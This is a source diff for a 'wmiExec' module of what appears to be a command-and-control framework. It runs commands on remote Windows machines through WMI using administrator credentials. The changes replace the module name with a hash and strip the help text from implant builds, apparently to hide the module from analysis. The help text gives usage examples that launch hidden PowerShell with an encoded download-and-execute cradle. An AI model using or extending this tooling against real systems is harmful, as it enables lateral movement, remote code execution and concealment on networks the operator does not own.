@@ -16,6 +16,9 @@
 #pragma comment(lib, "wbemuuid.lib")
 #endif
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 #ifdef __linux__
@@ -24,7 +27,8 @@ using namespace std;
 
 #endif
 
-const std::string moduleName = "wmiExec";
+constexpr std::string_view moduleName = "wmiExec";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -38,7 +42,11 @@ __declspec(dllexport) WmiExec* WmiExecConstructor()
 
 
 WmiExec::WmiExec()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -51,6 +59,7 @@ WmiExec::~WmiExec()
 std::string WmiExec::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "WmiExec:\n";
 	info += "Execute a command through Windows Management Instrumentation (WMI). \n";
     info += "The user have to be administrator of the remote machine. \n";
@@ -59,13 +68,14 @@ std::string WmiExec::getInfo()
 	info += "exemple:\n";
 	info += "- wmiExec -u DOMAIN\\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
     info += "- wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
-
+#endif
 	return info;
 }
 
 
 int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    if (splitedCmd.size() >= 5)
 	{
 		string mode = splitedCmd[1];
@@ -158,13 +168,7 @@ int WmiExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 		c2Message.set_returnvalue(getInfo());
 		return -1;
 	}
-
-#ifdef __linux__ 
-
-#elif _WIN32
-
 #endif
-
 	return 0;
 }
 
@@ -242,7 +246,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += "CoInitializeEx Failed: ";
         result += errMsg;
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -271,7 +275,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += errMsg;
         CoUninitialize();
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -293,7 +297,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         result += std::to_string(GetLastError());
         CoUninitialize();
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -325,7 +329,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pLoc->Release();     
         CoUninitialize();
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -380,7 +384,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pLoc->Release();     
         CoUninitialize();
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -403,7 +407,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         SysFreeString(ClassName);
         SysFreeString(MethodName);
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -426,7 +430,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         SysFreeString(ClassName);
         SysFreeString(MethodName);
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -449,7 +453,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         SysFreeString(ClassName);
         SysFreeString(MethodName);
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -475,7 +479,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         SysFreeString(ClassName);
         SysFreeString(MethodName);
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -505,7 +509,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
         pLoc->Release();
         CoUninitialize();    
 
-        c2RetMessage.set_instruction(m_name);
+        c2RetMessage.set_instruction(c2RetMessage.instruction());
         cmd += " ";
         cmd += data;
         c2RetMessage.set_cmd(cmd);
@@ -542,7 +546,7 @@ int WmiExec::process(C2Message &c2Message, C2Message &c2RetMessage)
     cmd += " ";
     cmd += data;
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(cmd);
 	c2RetMessage.set_returnvalue(result);
 	return 0;
